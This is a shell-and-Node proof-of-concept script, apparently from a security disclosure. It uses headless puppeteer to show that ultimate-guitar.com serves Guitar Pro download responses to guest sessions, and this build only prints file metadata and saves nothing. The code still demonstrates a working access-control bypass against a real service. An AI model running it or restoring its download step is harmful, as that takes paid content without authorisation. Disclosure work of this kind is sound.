#!/usr/bin/env sh
#                                          Jan 14, 2025
#                                 ADMIN]at[DTRH]dot[NET
#        █▀▀ █▀▀ █░░█ █▀▀█ ▒█░▒█ ▒█▀▀▀ ▀█▀ ▒█▀▀▀█ ▀▀█▀▀
#        █▀▀ █░░ █▀▀█ █░░█ ▒█▀▀█ ▒█▀▀▀ ▒█░ ░▀▀▀▄▄ ░▒█░░
#        ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀▀ ▒█░▒█ ▒█▄▄▄ ▄█▄ ▒█▄▄▄█ ░▒█░░
#
# #####################################################
# PoC - Primary   - Broken Access Policy
#       Secondary - Authentication Bypass
#       [ https://www.ultimate-guitar.com ]
#
# ─────────────────────────────────────────────────────────────────────────────
#  ⚠  OBSERVE-ONLY BUILD — THIS SCRIPT NO LONGER DOWNLOADS ANYTHING
#
#  This copy is deliberately broken as a downloader. If you run it expecting a
#  file, you will not get one: the curl replay is gone and nothing is written to
#  your working directory.
#
#  What it still does is observe the page's own request to
#  tabs.ultimate-guitar.com/download/public/ and print what that response says
#  about the file:
#
#      artist  ·  song  ·  file size  ·  Guitar Pro version
#
#  That is the whole of the finding. Reading the metadata demonstrates that a
#  guest session is served the download response; keeping the payload is not
#  required to prove it, so this build does not keep it. See ../README.md.
#
#  Chromium may stage a partial response in a temporary directory that is
#  deleted before the script exits. Nothing lands in your cwd, ~/Downloads, or
#  the download queue of any other tool in this repo.
# ─────────────────────────────────────────────────────────────────────────────
#
# What is echoHEIST?
# echoHEIST.sh demonstrated that the authentication wall in front of Guitar Pro
# downloads could be bypassed by capturing the browser's own download request.
# It leveraged nodejs + puppeteer from a linux shell environment.
#
# Usage: chmod +x echoHEIST.sh && ./echoHEIST.sh [URL]
#
# The disclosure report can be found here : ../README.md

usage() {
  echo "Usage: $0 <URL>"
  echo "Observe-only: prints artist, song, size and Guitar Pro version. Saves nothing."
  exit 1
}

# Check for URL argument
[ -z "$1" ] && usage

iURL="$1"

# A name for the report only. This script never writes a file with it.
oName=$(echo "$iURL" | sed -E 's|https://tabs.ultimate-guitar.com/tab/||' | sed 's|/|_|g' | sed -E 's/_GP.*//')

echo "Observing: $iURL"
echo "Report name (not written): ${oName}"

# Node is required for the observation; puppeteer must be installed in this tree
# (npm install at the repository root).
if ! command -v node >/dev/null 2>&1; then
  echo "node is required for the observation phase; install Node.js 20+." >&2
  exit 1
fi
if [ ! -d node_modules/puppeteer ]; then
  echo "puppeteer is not installed in this tree. Run 'npm install' at the" >&2
  echo "repository root first, then try again." >&2
  exit 1
fi

# The helper lives in $PWD so `import puppeteer` resolves against ./node_modules,
# exactly like the original `node -e` did. It is removed on exit.
OBSERVER=$(mktemp ./.echoheist-observe-XXXXXX.mjs) || exit 1
trap 'rm -f "$OBSERVER"' EXIT INT TERM

cat > "$OBSERVER" <<'JS'
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import process from "node:process";
import puppeteer from "puppeteer";

const marker = "/download/public/";
const url = process.env.EH_URL;
const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "echoheist-observe-"));

// The observation is complete as soon as the metadata is printed.
let printed = false;
let browser = null;

function hostPath(raw) {
  try {
    const parsed = new URL(raw);
    const parts = parsed.pathname.split("/").filter(Boolean);
    // /tab/<artist>/<song>-<tab id>
    if (parts[0] === "tab" && parts.length >= 3) {
      return {
        artist: decodeURIComponent(parts[1]).replace(/-/g, " "),
        song: decodeURIComponent(parts[2]).replace(/-\d+$/, "").replace(/-/g, " ")
      };
    }
  } catch {
    // Fall through to the unknown labels below.
  }
  return { artist: "unknown", song: "unknown" };
}

function gpVersion(...candidates) {
  for (const candidate of candidates) {
    const ext = String(candidate || "").match(/\.(gp[3-7x]?|gpx)\b/i);
    if (ext) return ext[1].toLowerCase();
  }
  return "unknown";
}

function sizeOf(headers) {
  const raw = headers["content-length"];
  const bytes = raw ? Number.parseInt(raw, 10) : NaN;
  return Number.isFinite(bytes) && bytes > 0 ? `${bytes} bytes` : "unknown";
}

async function finish(code) {
  if (browser) await browser.close().catch(() => {});
  await fs.rm(tempDir, { recursive: true, force: true });
  process.exit(code);
}

const fallback = hostPath(url);

try {
  browser = await puppeteer.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"]
  });
  const page = await browser.newPage();

  // Chromium must not drop the payload into the user's download directory. It
  // stages into tempDir, which finish() deletes before exit.
  await browser.defaultBrowserContext().setDownloadBehavior({ policy: "allow", downloadPath: tempDir });

  page.on("response", async response => {
    if (printed || !response.url().includes(marker)) return;
    if (response.status() < 200 || response.status() >= 300) {
      console.log(`  response status ${response.status()} — no file behind it`);
      return;
    }
    printed = true;
    const headers = response.headers();
    const disposition = headers["content-disposition"] || "";
    const filename = (/filename\*?=(?:UTF-8''|utf-8'')?"?([^";]+)"?/i.exec(disposition) || [])[1] || "";

    console.log("");
    console.log("  ── observation ─────────────────────────────────────────");
    console.log(`  artist          : ${fallback.artist}`);
    console.log(`  song            : ${fallback.song}`);
    console.log(`  size            : ${sizeOf(headers)}`);
    console.log(`  guitar pro      : ${gpVersion(filename, headers["content-type"], disposition)}`);
    console.log(`  content-type    : ${headers["content-type"] || "none"}`);
    console.log(`  server filename : ${filename || "none declared"}`);
    console.log("  ────────────────────────────────────────────────────────");
    console.log("");
    console.log("  This build stops here. The payload was not saved, and the captured");
    console.log("  request was not replayed. See README.md for why that is the whole finding.");
    await finish(0);
  });

  await page.goto(url, { waitUntil: "networkidle2", timeout: 60000 });

  // Give a late response a moment to arrive before giving up.
  await new Promise(resolve => setTimeout(resolve, 5000));
  if (!printed) {
    console.error("  no response on", marker, "was observed — the page may need a session, or the flow may have changed");
  }
  await finish(printed ? 0 : 1);
} catch (error) {
  console.error("  observation failed:", error.message || String(error));
  await finish(1);
}
JS

EH_URL="$iURL" node "$OBSERVER"

# KBS <admin [at] dtrh [dot] net
# https://dtrh.net
# eof
